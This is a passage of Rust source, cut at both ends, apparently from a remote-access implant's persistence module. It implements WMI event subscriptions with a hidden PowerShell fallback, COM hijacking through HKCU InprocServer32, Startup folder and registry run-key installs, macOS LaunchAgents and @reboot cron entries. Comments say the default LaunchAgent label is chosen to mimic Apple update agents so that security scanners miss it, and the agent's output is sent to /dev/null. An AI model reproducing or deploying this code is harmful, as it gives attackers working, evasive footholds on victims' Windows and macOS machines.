            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("SpawnInstance(__FilterToConsumerBinding) failed: 0x{:08X}", hr));
        }

        // Filter reference: "__EventFilter.Name=\"<name>\""
        let filter_ref = format!("__EventFilter.Name=\"{}\"", subscription_name);
        let consumer_ref = format!("CommandLineEventConsumer.Name=\"{}\"", subscription_name);
        put_bstr_prop(binding_inst, "Filter", &filter_ref);
        put_bstr_prop(binding_inst, "Consumer", &consumer_ref);

        let hr = ((*(*services_ptr).lpvtbl).put_instance)(
            services_ptr, binding_inst, WBEM_FLAG_CREATE_OR_UPDATE,
            ptr::null_mut(), ptr::null_mut(),
        );
        ((*(*binding_inst).lpvtbl).release)(binding_inst);
        ((*(*services_ptr).lpvtbl).release)(services_ptr);
        ((*locator.lpvtbl).release)(locator_ptr);

        if !SUCCEEDED(hr) {
            return Err(anyhow!("PutInstance(__FilterToConsumerBinding) failed: 0x{:08X}", hr));
        }
        Ok(())
    }

    // Escape a value for embedding inside a single-quoted PowerShell string.
    fn escape_ps_string(s: &str) -> String {
        s.replace('\'', "''")
    }

    // PowerShell fallback for WMI registration
    unsafe fn wmi_install_powershell(
        subscription_name: &str,
        exe_path: &str,
    ) -> Result<()> {
        let escaped_name = escape_ps_string(subscription_name);
        let escaped_path = escape_ps_string(exe_path);
        let filter_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
        let ps_cmd = format!(
            "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{{Name='{}';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='{}'}};
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{{Name='{}';CommandLineTemplate='{}'}};
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{Filter=$filter;Consumer=$consumer}}",
            escaped_name, filter_query, escaped_name, escaped_path
        );
        let status = std::process::Command::new("powershell")
            .args(["-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
            .status()
            .map_err(|e| anyhow!("WmiSubscription: failed to spawn powershell: {}", e))?;
        if !status.success() {
            return Err(anyhow!("WmiSubscription: powershell returned non-zero exit code"));
        }
        Ok(())
    }

    // ── Shared WMI connection helper (used by remove & verify) ───────────
    //
    // Connects to root\subscription via COM and returns the IWbemServices
    // pointer.  The caller must Release both the services and locator pointers
    // when done.
    unsafe fn wmi_connect() -> Result<(*mut IWbemLocator, *mut IWbemServices)> {
        use winapi::shared::winerror::SUCCEEDED;
        use winapi::um::combaseapi::{CoCreateInstance, CoSetProxyBlanket};
        use winapi::shared::rpcdce::{
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
            RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
        };
        use winapi::um::combaseapi::CLSCTX_INPROC_SERVER;

        let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_WBEM_LOCATOR,
            ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            &IID_IWBEM_LOCATOR,
            &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
        );
        if !SUCCEEDED(hr) {
            return Err(anyhow!("CoCreateInstance(WbemLocator) failed: 0x{:08X}", hr));
        }

        let ns_bstr = alloc_bstr("root\\subscription");
        let mut services_ptr: *mut IWbemServices = ptr::null_mut();
        let hr = ((*(*locator_ptr).lpvtbl).connect_server)(
            locator_ptr,
            ns_bstr,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut services_ptr,
        );
        free_bstr(ns_bstr);
        if !SUCCEEDED(hr) {
            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
            return Err(anyhow!("IWbemLocator::ConnectServer failed: 0x{:08X}", hr));
        }

        let hr = CoSetProxyBlanket(
            services_ptr as *mut IUnknown,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            ptr::null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            0,
        );
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
            return Err(anyhow!("CoSetProxyBlanket failed: 0x{:08X}", hr));
        }

        Ok((locator_ptr, services_ptr))
    }

    // ── COM-based WMI removal ───────────────────────────────────────────
    //
    // Connects to root\subscription, queries for the three WMI objects
    // associated with the subscription name (__FilterToConsumerBinding,
    // CommandLineEventConsumer, __EventFilter), and deletes each one via
    // IWbemServices::DeleteInstance.
    unsafe fn wmi_remove_com(subscription_name: &str) -> Result<()> {
        use winapi::shared::winerror::SUCCEEDED;

        let (locator, services) = wmi_connect()?;

        // We must delete in dependency order:
        //   1. __FilterToConsumerBinding (references Filter + Consumer)
        //   2. CommandLineEventConsumer
        //   3. __EventFilter
        let classes_and_keys: &[(&str, &str)] = &[
            ("__FilterToConsumerBinding",
             &format!("__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{}\\\"\"", subscription_name)),
            ("CommandLineEventConsumer",
             &format!("CommandLineEventConsumer.Name=\"{}\"", subscription_name)),
            ("__EventFilter",
             &format!("__EventFilter.Name=\"{}\"", subscription_name)),
        ];

        let wql_bstr = alloc_bstr("WQL");

        for &(class, _key_path) in classes_and_keys {
            // Query for instances of this class matching the subscription name.
            let query = format!("SELECT * FROM {} WHERE Name = '{}'", class, subscription_name);
            let query_bstr = alloc_bstr(&query);

            let mut enum_ptr: *mut IEnumWbemClassObject = ptr::null_mut();
            let hr = ((*(*services).lpvtbl).exec_query)(
                services,
                wql_bstr,
                query_bstr,
                WBEM_FLAG_FORWARD_ONLY,
                ptr::null_mut(),
                &mut enum_ptr as *mut _ as *mut *mut std::ffi::c_void,
            );
            free_bstr(query_bstr);

            if !SUCCEEDED(hr) || enum_ptr.is_null() {
                // Query failure for one class is non-fatal — continue trying
                // the others.  The subscription may be partially torn down.
                continue;
            }

            // Iterate results and delete each instance.
            loop {
                let mut obj: *mut IWbemClassObject = ptr::null_mut();
                let mut returned: u32 = 0;
                let next_hr = ((*(*enum_ptr).lpvtbl).next)(
                    enum_ptr,
                    WBEM_INFINITE,
                    1,
                    &mut obj,
                    &mut returned,
                );
                if next_hr != winapi::shared::winerror::S_OK || returned == 0 {
                    break;
                }

                // Read the __PATH property to get the full object path for
                // DeleteInstance.
                let path_str = match get_bstr_prop(obj, "__PATH") {
                    Ok(p) => p,
                    Err(_) => {
                        ((*(*obj).lpvtbl).release)(obj);
                        continue;
                    }
                };
                ((*(*obj).lpvtbl).release)(obj);

                let path_bstr = alloc_bstr(&path_str);
                let del_hr = ((*(*services).lpvtbl).delete_instance)(
                    services,
                    path_bstr,
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                free_bstr(path_bstr);

                if !SUCCEEDED(del_hr) {
                    log::warn!(
                        "WmiSubscription::remove: DeleteInstance('{}') failed: 0x{:08X}",
                        path_str, del_hr
                    );
                }
            }
            ((*(*enum_ptr).lpvtbl).release)(enum_ptr);
        }

        free_bstr(wql_bstr);
        ((*(*services).lpvtbl).release)(services);
        ((*(*locator).lpvtbl).release)(locator);
        Ok(())
    }

    // ── COM-based WMI verification ──────────────────────────────────────
    //
    // Queries root\subscription for an __EventFilter with the given name.
    // Returns Ok(true) if found, Ok(false) if not.
    unsafe fn wmi_verify_com(subscription_name: &str) -> Result<bool> {
        use winapi::shared::winerror::S_OK;

        let (locator, services) = wmi_connect()?;

        let wql_bstr = alloc_bstr("WQL");
        let query = format!(
            "SELECT * FROM __EventFilter WHERE Name = '{}'",
            subscription_name
        );
        let query_bstr = alloc_bstr(&query);

        let mut enum_ptr: *mut IEnumWbemClassObject = ptr::null_mut();
        let hr = ((*(*services).lpvtbl).exec_query)(
            services,
            wql_bstr,
            query_bstr,
            WBEM_FLAG_FORWARD_ONLY,
            ptr::null_mut(),
            &mut enum_ptr as *mut _ as *mut *mut std::ffi::c_void,
        );
        free_bstr(query_bstr);
        free_bstr(wql_bstr);

        let found = if SUCCEEDED(hr) && !enum_ptr.is_null() {
            let mut obj: *mut IWbemClassObject = ptr::null_mut();
            let mut returned: u32 = 0;
            let next_hr = ((*(*enum_ptr).lpvtbl).next)(
                enum_ptr,
                WBEM_INFINITE,
                1,
                &mut obj,
                &mut returned,
            );
            if next_hr == S_OK && returned > 0 {
                ((*(*obj).lpvtbl).release)(obj);
                true
            } else {
                false
            }
        } else {
            false
        };

        if !enum_ptr.is_null() {
            ((*(*enum_ptr).lpvtbl).release)(enum_ptr);
        }
        ((*(*services).lpvtbl).release)(services);
        ((*(*locator).lpvtbl).release)(locator);
        Ok(found)
    }

    pub struct WmiSubscription {
        pub subscription_name: String,
    }

    impl WmiSubscription {
        /// Construct with a config-driven or randomly-generated subscription name.
        pub fn from_config(cfg: &PersistenceConfig) -> Self {
            Self {
                subscription_name: resolve_wmi_subscription_name(cfg),
            }
        }
    }

    impl Persist for WmiSubscription {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            use winapi::shared::winerror::SUCCEEDED;
            use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
            use winapi::um::objbase::COINIT_MULTITHREADED;

            let exe_path = executable_path.to_string_lossy();
            log::info!(
                "WmiSubscription::install: registering '{}' for '{}'",
                self.subscription_name,
                exe_path
            );

            unsafe {
                const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
                // S_OK      — COM initialised successfully; we own it and must
                //              call CoUninitialize when done.
                // S_FALSE   — COM already initialised on this thread (same apartment);
                //              still balanced — call CoUninitialize.
                // RPC_E_CHANGED_MODE — COM already initialised in a *different* apartment
                //              model.  We do NOT own the initialisation and must NOT call
                //              CoUninitialize, or we'll tear down the caller's COM setup.
                let should_uninitialize = SUCCEEDED(hr);
                if !should_uninitialize && hr != RPC_E_CHANGED_MODE {
                    return Err(anyhow!(
                        "WmiSubscription::install: CoInitializeEx failed: 0x{:08X}",
                        hr
                    ));
                }
                if hr == RPC_E_CHANGED_MODE {
                    log::debug!(
                        "WmiSubscription::install: COM already initialised in a different \
                         apartment (RPC_E_CHANGED_MODE); proceeding without owning COM lifetime"
                    );
                }

                let result = wmi_install_com(&self.subscription_name, exe_path.as_ref());
                if let Err(ref e) = result {
                    log::warn!(
                        "WmiSubscription::install: COM path failed ({}), falling back to PowerShell",
                        e
                    );
                    let ps_result = wmi_install_powershell(&self.subscription_name, exe_path.as_ref());
                    if should_uninitialize {
                        CoUninitialize();
                    }
                    ps_result?;
                } else {
                    if should_uninitialize {
                        CoUninitialize();
                    }
                }

                log::info!("WmiSubscription::install: registered successfully");
            }
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::shared::winerror::SUCCEEDED;
            use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
            use winapi::um::objbase::COINIT_MULTITHREADED;

            unsafe {
                const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
                let should_uninitialize = SUCCEEDED(hr);
                if !should_uninitialize && hr != RPC_E_CHANGED_MODE {
                    return Err(anyhow!(
                        "WmiSubscription::remove: CoInitializeEx failed: 0x{:08X}",
                        hr
                    ));
                }

                let result = wmi_remove_com(&self.subscription_name);
                if let Err(ref e) = result {
                    log::warn!("WmiSubscription::remove: COM path failed ({})", e);
                }
                if should_uninitialize {
                    CoUninitialize();
                }
                result?;
            }
            log::info!(
                "WmiSubscription::remove: removed '{}'",
                self.subscription_name
            );
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::shared::winerror::SUCCEEDED;
            use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};
            use winapi::um::objbase::COINIT_MULTITHREADED;

            unsafe {
                const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
                let should_uninitialize = SUCCEEDED(hr);
                if !should_uninitialize && hr != RPC_E_CHANGED_MODE {
                    return Err(anyhow!(
                        "WmiSubscription::verify: CoInitializeEx failed: 0x{:08X}",
                        hr
                    ));
                }

                let result = wmi_verify_com(&self.subscription_name);
                if should_uninitialize {
                    CoUninitialize();
                }
                result
            }
        }
    }

    // ── FR-1C: COM Hijacking ──────────────────────────────────────────────────
    pub struct ComHijacking {
        /// CLSID to hijack under HKCU\Software\Classes\CLSID\{...}\InprocServer32
        pub clsid: String,
    }

    impl ComHijacking {
        /// Construct with a config-driven or randomly-generated CLSID.
        pub fn from_config(cfg: &PersistenceConfig) -> Self {
            Self {
                clsid: resolve_com_hijack_clsid(cfg),
            }
        }
    }

    impl Persist for ComHijacking {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if executable_path
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| !ext.eq_ignore_ascii_case("dll"))
                .unwrap_or(true)
            {
                return Err(anyhow!(
                    "ComHijacking::install requires an in-process DLL; refusing executable path '{}'",
                    executable_path.display()
                ));
            }
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
            use winapi::um::winreg::{
                RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
            };

            let subkey: Vec<u16> =
                format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
                    .encode_utf16()
                    .collect();
            let val: Vec<u16> = executable_path
                .to_string_lossy()
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegCreateKeyExW(
                    HKEY_CURRENT_USER,
                    subkey.as_ptr(),
                    0,
                    ptr::null_mut(),
                    0,
                    KEY_WRITE,
                    ptr::null_mut(),
                    &mut hkey,
                    ptr::null_mut(),
                );
                if ret != 0 {
                    return Err(anyhow!(
                        "ComHijacking::install: RegCreateKeyExW failed: {}",
                        ret
                    ));
                }
                RegSetValueExW(
                    hkey,
                    ptr::null(),
                    0,
                    REG_SZ,
                    val.as_ptr() as _,
                    (val.len() * 2) as u32,
                );
                // Set ThreadingModel
                let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
                let tm_val: Vec<u16> = "Apartment\0".encode_utf16().collect();
                RegSetValueExW(
                    hkey,
                    tm_name.as_ptr(),
                    0,
                    REG_SZ,
                    tm_val.as_ptr() as _,
                    ((tm_val.len() - 1) * 2) as u32,
                );
                RegCloseKey(hkey);
            }
            log::info!(
                "ComHijacking::install: CLSID {} → '{}'",
                self.clsid,
                executable_path.display()
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::um::winreg::{RegDeleteTreeW, HKEY_CURRENT_USER};

            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid)
                .encode_utf16()
                .collect();
            unsafe {
                RegDeleteTreeW(HKEY_CURRENT_USER, subkey.as_ptr());
            }
            log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::um::winnt::KEY_READ;
            use winapi::um::winreg::{RegCloseKey, RegOpenKeyExW, HKEY_CURRENT_USER};

            let subkey: Vec<u16> =
                format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid)
                    .encode_utf16()
                    .collect();
            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegOpenKeyExW(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut hkey);
                if ret == 0 {
                    RegCloseKey(hkey);
                    Ok(true)
                } else {
                    Ok(false)
                }
            }
        }
    }

    // ── FR-1D: Startup Folder ─────────────────────────────────────────────────
    pub struct StartupFolder {
        pub filename: String,
    }

    impl StartupFolder {
        /// Construct with a config-driven or randomly-generated filename.
        pub fn from_config(cfg: &PersistenceConfig) -> Self {
            Self {
                filename: resolve_startup_filename(cfg),
            }
        }

        fn startup_path(&self) -> Option<PathBuf> {
            let mut target = dirs::config_dir()?;
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
            target.push(&self.filename);
            Some(target)
        }
    }

    impl Persist for StartupFolder {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let target = self.startup_path()
                .ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
            std::fs::copy(executable_path, &target)
                .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
            log::info!("StartupFolder::install: copied to '{}'", target.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            if let Some(target) = self.startup_path() {
                let _ = std::fs::remove_file(&target);
                log::info!("StartupFolder::remove: removed '{}'", target.display());
            }
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            match self.startup_path() {
                Some(target) => Ok(target.exists()),
                None => Ok(false),
            }
        }
    }

    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let full_cfg = crate::config::load_config().unwrap_or_default();
        let cfg = &full_cfg.persistence;

        if cfg.registry_run_key {
            if let Err(e) = RegistryRunKey::from_config(cfg).install(&exe) {
                log::warn!("RegistryRunKey install failed (non-fatal): {}", e);
            }
        }
        if cfg.startup_folder {
            if let Err(e) = StartupFolder::from_config(cfg).install(&exe) {
                log::warn!("StartupFolder install failed (non-fatal): {}", e);
            }
        }
        if cfg.wmi_subscription {
            if let Err(e) = WmiSubscription::from_config(cfg).install(&exe) {
                log::warn!("WmiSubscription install failed (non-fatal): {}", e);
            }
        }
        if cfg.com_hijacking {
            // COM hijacking replaces an InProcServer32 DLL, so the agent must be
            // built as a DLL (e.g. --crate-type cdylib).  When running as an EXE
            // the file extension check inside ComHijacking::install() would always
            // reject the path — skip early and log the reason instead of emitting
            // a misleading "install failed" warning.
            let is_dll = exe.extension().map_or(false, |ext| {
                ext.eq_ignore_ascii_case("dll")
            });
            if !is_dll {
                log::info!(
                    "ComHijacking: skipping — agent binary is '{}' (not a DLL); \
                     COM hijacking requires a cdylib build target",
                    exe.display()
                );
            } else if let Err(e) = ComHijacking::from_config(cfg).install(&exe) {
                log::warn!("ComHijacking install failed (non-fatal): {}", e);
            }
        }

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let full_cfg = crate::config::load_config().unwrap_or_default();
        let cfg = &full_cfg.persistence;
        let _ = RegistryRunKey::from_config(cfg).remove();
        let _ = StartupFolder::from_config(cfg).remove();
        let _ = WmiSubscription::from_config(cfg).remove();
        let _ = ComHijacking::from_config(cfg).remove();
        Ok(exe)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// macOS persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(target_os = "macos")]
pub use macos::*;
#[cfg(target_os = "macos")]
pub mod macos {
    use super::{Persist, shell_quote_single};
    use anyhow::{anyhow, Result};
    use std::path::{Path, PathBuf};

    /// Escape the five XML-special characters so that arbitrary strings can be
    /// safely embedded in plist `<string>` elements without breaking the XML
    /// structure or enabling injection.
    fn xml_escape(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        for ch in s.chars() {
            match ch {
                '&'  => out.push_str("&amp;"),
                '<'  => out.push_str("&lt;"),
                '>'  => out.push_str("&gt;"),
                '"'  => out.push_str("&quot;"),
                '\'' => out.push_str("&apos;"),
                c    => out.push(c),
            }
        }
        out
    }

    /// LaunchAgent persistence.  The default label uses a value that blends
    /// with legitimate Apple software update agents; callers may override it.
    pub struct LaunchAgent {
        pub label: String,
        /// When `true`, uses `launchctl asuser <uid> launchctl bootstrap/bootout`
        /// for GUI-session bootstrap (LoginItem behaviour).
        /// When `false` (default), uses direct `launchctl bootstrap gui/<uid>`.
        pub asuser_bootstrap: bool,
    }

    impl Default for LaunchAgent {
        fn default() -> Self {
            // Use a label that resembles Apple's own XProtect/MRT agents,
            // which security scanners do not flag on sight.
            Self {
                label: "com.apple.xpc.system-updater".to_string(),
                asuser_bootstrap: false,
            }
        }
    }

    impl Persist for LaunchAgent {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let label_escaped = xml_escape(&self.label);
            let exe_escaped = xml_escape(&executable_path.to_string_lossy());
            let plist = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"#,
                label = label_escaped,
                exe = exe_escaped
            );
            let mut plist_path =
                dirs::home_dir().ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
            // Create the directory if it does not exist.
            let agents_dir = plist_path.join("Library/LaunchAgents");
            std::fs::create_dir_all(&agents_dir)
                .map_err(|e| anyhow!("LaunchAgent::install: mkdir failed: {}", e))?;
            plist_path = agents_dir.join(format!("{}.plist", self.label));
            std::fs::write(&plist_path, plist)
                .map_err(|e| anyhow!("LaunchAgent::install: write failed: {}", e))?;
            // launchctl load -w is deprecated on macOS 10.10+; use the
            // bootstrap domain command instead.
            #[cfg(target_os = "macos")]
            {
                let uid = unsafe { libc::getuid() };
                let uid_str = uid.to_string();
                let gui_domain = format!("gui/{uid}");
                if self.asuser_bootstrap {
                    // GUI-session bootstrap via launchctl asuser (LoginItem pattern).
                    let _ = std::process::Command::new("launchctl")
                        .arg("asuser").arg(&uid_str)
                        .arg("launchctl").arg("bootout")
                        .arg(&gui_domain).arg(&plist_path)
                        .status();
                    let bootstrap = std::process::Command::new("launchctl")
                        .arg("asuser").arg(&uid_str)
                        .arg("launchctl").arg("bootstrap")
                        .arg(&gui_domain).arg(&plist_path)
                        .output()
                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl asuser bootstrap: {}", e))?;
                    if !bootstrap.status.success() {
                        let stderr = String::from_utf8_lossy(&bootstrap.stderr).trim().to_string();
                        let detail = if stderr.is_empty() {
                            "no stderr output".to_string()
                        } else {
                            stderr
                        };
                        return Err(anyhow!(
                            "LaunchAgent::install: failed to bootstrap '{}' via launchctl asuser: {}",
                            plist_path.display(),
                            detail
                        ));
                    }
                } else {
                    let status = std::process::Command::new("launchctl")
                        .args([
                            "bootstrap",
                            &gui_domain,
                            &plist_path.to_string_lossy(),
                        ])
                        .status()
                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl: {}", e))?;
                    if !status.success() {
                        // launchctl bootstrap returns 37 (ESRCH) when the service
                        // is already loaded; treat that as a non-fatal warning.
                        log::warn!(
                            "LaunchAgent::install: launchctl bootstrap returned non-zero (service may already be loaded)"
                        );
                    }
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                let _ = std::process::Command::new("launchctl")
                    .args(["load", "-w", &plist_path.to_string_lossy()])
                    .status();
            }
            log::info!("LaunchAgent::install: installed '{}'", plist_path.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let agents_dir = match dirs::home_dir() {
                Some(h) => h.join("Library/LaunchAgents"),
                None => return Ok(()),
            };
            let plist_path = agents_dir.join(format!("{}.plist", self.label));
            // launchctl unload is deprecated on macOS 10.10+; use bootout.
            #[cfg(target_os = "macos")]
            {
                let uid = unsafe { libc::getuid() };
                let uid_str = uid.to_string();
                let gui_domain = format!("gui/{uid}");
                if self.asuser_bootstrap {
                    let _ = std::process::Command::new("launchctl")
                        .arg("asuser").arg(&uid_str)
                        .arg("launchctl").arg("bootout")
                        .arg(&gui_domain).arg(&plist_path)
                        .status();
                } else {
                    let _ = std::process::Command::new("launchctl")
                        .args(["bootout", &gui_domain, &plist_path.to_string_lossy()])
                        .status();
                }
            }
            #[cfg(not(target_os = "macos"))]
            let _ = std::process::Command::new("launchctl")
                .args(["unload", &plist_path.to_string_lossy()])
                .status();
            let _ = std::fs::remove_file(&plist_path);
            log::info!("LaunchAgent::remove: unloaded '{}'", self.label);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let agents_dir = match dirs::home_dir() {
                Some(h) => h.join("Library/LaunchAgents"),
                None => return Ok(false),
            };
            let plist_path = agents_dir.join(format!("{}.plist", self.label));
            if !plist_path.exists() {
                return Ok(false);
            }
            if self.asuser_bootstrap {
                let uid = unsafe { libc::getuid() };
                let service = format!("gui/{}/{}", uid, self.label);
                let status = std::process::Command::new("launchctl")
                    .arg("asuser")
                    .arg(uid.to_string())
                    .arg("launchctl")
                    .arg("print")
                    .arg(&service)
                    .status()
                    .map_err(|e| anyhow!("LaunchAgent::verify: launchctl asuser print: {}", e))?;
                return Ok(status.success());
            }
            Ok(true)
        }
    }

    /// Cron-like persistence fallback for macOS.
    ///
    /// Attempts to install a `@reboot` cron entry.  On macOS with System
    /// Integrity Protection (SIP), `crontab` modifications may be silently
    /// ignored — the write appears to succeed but `crontab -l` shows no
    /// entry.  After each write, we verify with `crontab -l` that the
    /// expected entry is present; if verification fails we return an error
    /// suggesting the `LaunchAgent` path instead.
    pub struct CronJob;

    /// Marker string embedded in the cron entry so we can locate it later.
    const CRON_MARKER: &str = "# orchestra-persist";

    impl CronJob {
        /// Build the `@reboot` cron line for `executable_path`.
        fn cron_entry(executable_path: &PathBuf) -> String {
            format!(
                "@reboot {} {}",
                shell_quote_single(&executable_path.to_string_lossy()),
                CRON_MARKER
            )
        }

        /// Run `crontab -l` and return its stdout, or an empty string if the
        /// user has no crontab (exit 1 from crontab is "no crontab for user").
        fn read_crontab() -> String {
            let output = std::process::Command::new("crontab")
                .arg("-l")
                .output();
            match output {
                Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout).into_owned(),
                Ok(_) => {
                    // Non-zero exit (typically "no crontab for user") — treat
                    // as empty rather than an error.
                    String::new()
                }
                Err(e) => {
                    log::debug!("CronJob: crontab -l failed to execute: {e}");
                    String::new()
                }
            }
        }

        /// Verify that the expected cron entry is present in `crontab -l`.
        fn verify_cron_entry_present(executable_path: &PathBuf) -> bool {
            let expected = Self::cron_entry(executable_path);
            let current = Self::read_crontab();
            current.lines().any(|line| line == expected)
        }
    }

    impl Persist for CronJob {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let entry = Self::cron_entry(executable_path);

            // Read existing crontab (may be empty) and append our entry.
            let mut new_crontab = Self::read_crontab();
            // Strip any trailing newline so we don't accumulate blank lines.
            let trimmed = new_crontab.trim_end_matches('\n').to_string();
            new_crontab = if trimmed.is_empty() {
                format!("{entry}\n")
            } else {
                format!("{trimmed}\n{entry}\n")
            };

            // Pipe the new crontab content into `crontab -`.
            let mut child = std::process::Command::new("crontab")
                .arg("-")
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .map_err(|e| anyhow!("CronJob::install: failed to spawn crontab: {e}"))?;

            use std::io::Write;
            if let Some(mut stdin) = child.stdin.take() {
                let _ = stdin.write_all(new_crontab.as_bytes());
            }
            let status = child.wait().map_err(|e| {
                anyhow!("CronJob::install: failed to wait for crontab: {e}")
            })?;
            if !status.success() {
                return Err(anyhow!(
                    "CronJob::install: crontab - exited with status {status}; \
                     SIP may be blocking cron modifications — \
                     use LaunchAgent persistence instead"
                ));
            }

            // Verify that the entry actually landed.  On macOS with SIP,
            // crontab writes may be silently discarded.
            if !Self::verify_cron_entry_present(executable_path) {
                log::warn!(
                    "CronJob::install: crontab -l does not contain the expected \
                     @reboot entry; SIP may be blocking cron modifications on this host"
                );
                return Err(anyhow!(
                    "CronJob::install: crontab verification failed — \
                     the @reboot entry was not found in crontab -l output.  \
                     System Integrity Protection (SIP) may be blocking cron \
                     modifications.  Use LaunchAgent persistence instead"
                ));
            }

            log::info!("CronJob::install: crontab @reboot entry verified");
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            // Read current crontab and remove lines containing our marker.
            let current = Self::read_crontab();
            let filtered: String = current
                .lines()
                .filter(|line| !line.contains(CRON_MARKER))
                .collect::<Vec<&str>>()
                .join("\n");

            if filtered.is_empty() {
                // No remaining entries — remove the crontab entirely.
                let status = std::process::Command::new("crontab")
                    .arg("-r")
                    .status()
                    .map_err(|e| anyhow!("CronJob::remove: failed to run crontab -r: {e}"))?;
                if !status.success() {
                    // crontab -r returns non-zero when there is no crontab;
                    // that is not an error in the remove path.
                    log::debug!("CronJob::remove: crontab -r exited non-zero (no crontab)");
                }
            } else {
                // Write back without our entry.
                let new_crontab = format!("{filtered}\n");
                let mut child = std::process::Command::new("crontab")
                    .arg("-")
                    .stdin(std::process::Stdio::piped())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
                    .map_err(|e| {
                        anyhow!("CronJob::remove: failed to spawn crontab: {e}")
                    })?;
                use std::io::Write;
                if let Some(mut stdin) = child.stdin.take() {
                    let _ = stdin.write_all(new_crontab.as_bytes());
                }
                child.wait().map_err(|e| {
                    anyhow!("CronJob::remove: failed to wait for crontab: {e}")
                })?;
            }

            log::info!("CronJob::remove: cron entry removed");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            // We need the executable path to build the expected entry.
            // If we cannot determine it, fall back to a marker-only check.
            let exe = std::env::current_exe().ok();
            if let Some(ref exe_path) = exe {
                if Self::verify_cron_entry_present(exe_path) {
                    return Ok(true);
                }
            }
            // Fallback: check if any line in crontab contains our marker.
